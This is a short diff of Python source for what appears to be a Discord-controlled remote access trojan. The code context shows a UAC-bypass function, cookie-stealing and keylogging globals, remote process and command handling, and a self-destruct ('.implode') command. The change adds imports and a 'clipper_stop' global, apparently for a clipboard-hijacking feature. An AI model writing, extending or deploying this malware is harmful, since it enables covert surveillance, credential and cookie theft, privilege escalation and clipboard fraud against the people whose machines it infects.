@@ -30,6 +30,8 @@ import sys
 import os
 import time
 import ctypes
+import re
+import json
 
 def UACbypass(method: int = 1) -> bool:
     if GetSelf()[1]:
@@ -279,7 +281,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, filename
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, filename, clipper_stop
     if message.author != client.user:
         if message.channel.id in channel_ids.values():
             if message.content == '.implode':
